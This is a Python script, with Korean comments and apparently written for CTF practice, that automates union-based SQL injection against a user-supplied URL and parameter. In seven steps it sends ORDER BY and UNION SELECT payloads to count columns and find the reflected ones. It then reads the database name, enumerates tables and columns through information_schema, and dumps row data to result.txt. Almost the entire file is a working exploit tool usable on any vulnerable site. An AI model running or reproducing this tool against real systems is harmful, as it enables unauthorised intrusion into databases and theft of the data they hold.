import requests
from urllib import parse
from diff_match_patch import diff_match_patch
from bs4 import BeautifulSoup

f = open("result.txt",'w')
dmp = diff_match_patch()

##########################1단계 - sql injection point #link + parameter----------------------------
print(" -----------------------[*] 1st Step : SQL injection Point -----------------------\n")
#인풋 입력
print("\n type link ex : ctf.segfaulthub.com:7777/sqli_5/search.php")
links = "http://"+input("Link(without parameter) : http://")
print("\n type parameter ex : search")
parameter = "?"+input("Parameter Name : htpp://"+links+"?")+"="


##########################2단계 - 컬럼 개수 찾기 #columnCount ----------------------------
print("\n -----------------------[**] 2nd Step : Finding Column numbers -----------------------\n")
repeat = 10#int(input("Order by : how much? : "))

for i in range(1,repeat):
    payload = "1' order by "+str(i)+"#"
    f.write("Testing payload : "+payload+"\n")
    response = requests.get(links+parameter+parse.quote(payload))
    if payload not in response.text:
        columnCount = i-1
        print("Column number is "+str(columnCount))
        f.write("Column number is "+str(columnCount))
        break

###########################3단계 - 출력되는 컬럼 위치 찾기-------------------------------------------
print("\n -----------------------[***] 3rd Step : Finding holes -----------------------\n")

holeFinder = ''
for i in range(1,columnCount+1):
    holeFinder += str(i)*4
    if(i<columnCount):
        holeFinder += ','
    #1111,2222,3333,4444 이런식으로 늘어남
print(holeFinder)
holeList = []

payload = "1' union select "+holeFinder+"#"
f.write("Testing payload : "+payload+"\n")
response = requests.get(links+parameter+parse.quote(payload))
responseWOpayload = response.text.replace(payload,'')#결과에 payload가 나와서 구멍찾기 방해로 인한 결과오염 방지

for num in range(1,columnCount+1):
    if str(num)*4 in responseWOpayload:
        print("hole Exist in column number : "+str(num)+"\n")
        f.write("hole Exist in column number : "+str(num)+"\n")
        holeList.append(num)
    else:
        print("No hole in column number : "+str(num)+"\n")
        f.write("No hole in column number : "+str(num)+"\n")

print("Hole List : ")
print(holeList)

###########################4단계 - DB 확인--------------------------------------------------------
print("\n -----------------------[****] 4th Step : DB Name! -----------------------\n")

if len(holeList)>1:
    selectedHole = holeList[int(input("Select a hole you want to put payload in : column Number."))-1]
else:
    selectedHole = holeList[0]

payload = payload.replace(str(selectedHole)*4,'database()')
print(payload)
response_2 = requests.get(links+parameter+parse.quote(payload))

#response 와 response_2를 대조하여 다른 부분이 시작된다면 그 부분을 출력
before = BeautifulSoup(response.text,"lxml").text.replace('\n','')
after = BeautifulSoup(response_2.text,"lxml").text.replace('\n','')
res_dif = dmp.diff_main(before,after)
dmp.diff_cleanupSemantic(res_dif)

idx = 0
for d in res_dif:
    print("Number : "+str(idx))
    print(d)
    print('\n')
    idx+=1
#print(before)
#print(after)

selectedTupleidx = int(input("Which one is likely to be a DB Name? : Number."))
dbName = res_dif[selectedTupleidx][1]
print("DB name : "+dbName+"\n")
f.write("DB name : "+dbName+"\n")



###########################5단계 - 테이블 확인--------------------------------------------------------
print("\n -----------------------[*****] 5th Step : Table Name! -----------------------\n")
payload = payload.replace('#','')
payload = payload.replace('database()','table_name')
payload += " from information_schema.tables where table_schema='"+dbName+"' limit 0,1#"
repeat = 20 #int(input("table try : how many? : "))

#페이로드가 실패한 리스폰스를 저장해두고 해당 리스폰스와 같은 리스폰스가 오면 비교값에서 튜플이 1보다 많지 않을 것이니 그런 경우 실패한 리스폰스로 기억

#튜플의 길이를 기억해서 그 길이보다 작으면 철수하기

tableName = [None] * repeat
for i in range(1,repeat+1):
    print("Payload : "+payload+"\n")
    response_3 = requests.get(links+parameter+parse.quote(payload))
    before = BeautifulSoup(response.text,"lxml").text.replace('\n','')
    after = BeautifulSoup(response_3.text.replace(payload,''),"lxml").text.replace('\n','')
    res_dif = dmp.diff_main(before,after)
    dmp.diff_cleanupSemantic(res_dif)

    if i==1:#맨 처음에는 길이를 저장한다.(보통 맨 처음에는 값이 제대로 될테니까)
        res_len = len(res_dif)
    if res_len > len(res_dif):#값이 나오지 않는다면 break!
        payload = payload.replace('limit '+str(i-1)+',1','limit 0,1')
        break

    idx = 0
    for d in res_dif:
        print("Number : "+str(idx))
        print(d)
        print('\n')
        idx+=1

    selectedTupleidx = int(input("Which one is likely to be a table Name? : Number."))
    tableName[i-1]= res_dif[selectedTupleidx][1]
    print("Table name : "+str(i)+". "+tableName[i-1]+"\n")
    f.write("Table name : "+str(i)+". "+tableName[i-1]+"\n")
    payload = payload.replace('limit '+str(i-1)+',1','limit '+str(i)+',1')

print("_______________table all searched_______________")
tableName = list(filter(None,tableName))

for i in range(0,len(tableName)):
    if tableName[i] is not None:
        print("table "+str(i+1)+". "+tableName[i])

if len(tableName)>1:
    table = tableName[int(input("Select a table : table Number."))-1]
else:
    table = tableName[0]
f.write("selected Table : "+table+"\n")

###########################6단계 - 컬럼 확인--------------------------------------------------------
print("\n -----------------------[******] 6th Step : Column Name! -----------------------\n")
payload = payload.replace('table_name','column_name')
payload = payload.replace('information_schema.tables','information_schema.columns')
payload = payload.replace('table_schema','table_name')
payload = payload.replace(dbName,table)

columnName = [None] * repeat
for i in range(1,repeat+1):
    print("Payload : "+payload+"\n")
    response_3 = requests.get(links+parameter+parse.quote(payload))
    before = BeautifulSoup(response.text,"lxml").text.replace('\n','')
    after = BeautifulSoup(response_3.text.replace(payload,''),"lxml").text.replace('\n','')
    res_dif = dmp.diff_main(before,after)
    dmp.diff_cleanupSemantic(res_dif)

    if i==1:#맨 처음에는 길이를 저장한다.(보통 맨 처음에는 값이 제대로 될테니까)
        res_len = len(res_dif)
    if res_len > len(res_dif):#값이 나오지 않는다면 break!
        payload = payload.replace('limit '+str(i-1)+',1','limit 0,1')
        break

    idx = 0
    for d in res_dif:
        print("Number : "+str(idx))
        print(d)
        print('\n')
        idx+=1

    selectedTupleidx = int(input("Which one is likely to be a column Name? : Number."))
    columnName[i-1]= res_dif[selectedTupleidx][1]
    print("Column name : "+str(i)+". "+columnName[i-1]+"\n")
    f.write("Column name : "+str(i)+". "+columnName[i-1]+"\n")
    payload = payload.replace('limit '+str(i-1)+',1','limit '+str(i)+',1')


print("_______________column all searched_______________")
columnName = list(filter(None,columnName))

for i in range(0,len(columnName)):
    if columnName[i] is not None:
        print("column "+str(i+1)+". "+columnName[i])

if len(columnName)>1:
    column = columnName[int(input("Select a column : column Number."))-1]
else:
    column  = columnName[0]
f.write("selected Column : "+column)

###########################7단계 - 데이터 추출--------------------------------------------------------
print("\n -----------------------[*******] 7th Step : DB squeeze! -----------------------\n")
#1' union select 1111,2222,3333,4444,5555,column_name from information_schema.columns where table_name='game_user' limit 0,1#
payload = payload.replace('column_name',column)
payload = payload.replace(table,'')#순서중요
payload = payload.replace('information_schema.columns',table)
payload = payload.replace('where table_name=\'\'','')


rowName = [None] * repeat
for i in range(1,repeat+1):
    print("Payload : "+payload+"\n")
    response_3 = requests.get(links+parameter+parse.quote(payload))
    before = BeautifulSoup(response.text,"lxml").text.replace('\n','')
    after = BeautifulSoup(response_3.text.replace(payload,''),"lxml").text.replace('\n','')
    res_dif = dmp.diff_main(before,after)
    dmp.diff_cleanupSemantic(res_dif)

    if i==1:#맨 처음에는 길이를 저장한다.(보통 맨 처음에는 값이 제대로 될테니까)
        res_len = len(res_dif)
    '''if res_len != len(res_dif):#값이 나오지 않는다면 break!
        payload = payload.replace('limit '+str(i-1)+',1','limit 0,1')
        break'''#로우에서는 쓰지 않는다.

    idx = 0
    for d in res_dif:
        print("Number : "+str(idx))
        print(d)
        print('\n')
        idx+=1
        
    selectedTupleidx = int(input("Which one is likely to be a row Name? (type 999 to exit): Number."))
    if selectedTupleidx == 999:
        break
    rowName[i-1] = res_dif[selectedTupleidx][1]
    print("row name : "+str(i)+". "+rowName[i-1]+"\n")
    f.write("row name : "+str(i)+". "+rowName[i-1]+"\n")
    payload = payload.replace('limit '+str(i-1)+',1','limit '+str(i)+',1')


print("_______________row all searched_______________")
rowName = list(filter(None,rowName))

for i in range(0,len(rowName)):
    if rowName[i] is not None:
        print(table+" table's row "+str(i+1)+". "+rowName[i])



f.close()
#print("\n lets put payload! ex : 1' or true limit 0,1#")
#payload = input("Payload : ")
